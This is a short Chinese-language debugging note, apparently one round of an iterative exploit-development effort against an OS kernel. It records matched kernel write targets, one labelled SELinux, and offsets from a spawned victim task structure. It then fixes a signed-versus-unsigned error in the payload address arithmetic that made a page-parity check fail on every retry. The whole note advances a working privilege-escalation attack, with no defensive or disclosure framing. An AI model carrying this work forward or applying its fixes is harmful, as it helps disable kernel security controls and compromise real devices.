# 43499 · w1 target 与归档逐字相等 + 奇偶算式的符号问题（round 123）

## 已经到手的强证据

```
main: step=w1 target=0xffffff802adaad88        ← 与归档 === W1: SELinux === target=0xffffff802adaad88 **逐字符相等** ✓
main: layout matches=1 accepts=1 value=0xffffff802abfd588   ← w2 的 value 也等于归档别名 ✓
```

## 奇偶这关过不去，算式摊开就清楚（✗ 在我）

```
page_value = payload_base + 0x100
payload_base = prepared.base + payload_delta
payload_delta = 0xFFFFFFFFFFFF0000 = -0x10000（**有符号**）
⇒ page_value = base − 0x10000 + 0x100
⇒ 判据 ((page_value >> 16) & 1) == 1 ⇒ 我却把 delta 当**无符号**加 ⇒ 结果落在同一类 ⇒ 8 次重试全不合格 ✗
```

⇒ 正确做法：`payload_base` 必须按**有符号**算（`static_cast<std::int64_t>` 相加后再转回 ✓），
  或者等价地写 `payload_base = base - 0x10000`（当 delta 为负时 ✓）。修完再验奇偶 ✓。

## 其余状态（本轮）

- `victim spawned task=0xffffffc03714beb0` ⇒ w2/w3 的目标 = 该值 + 0x798 / + 0x0 ✓（随每次运行变化，不可与
  归档的绝对地址直接比 ✓，但**偏移**可比 ✓）；
- 三次尝试的 target 都按三步三请求分别取 ✓（`step=w1 target=…` ✓ 已能逐行看到 ✓）。
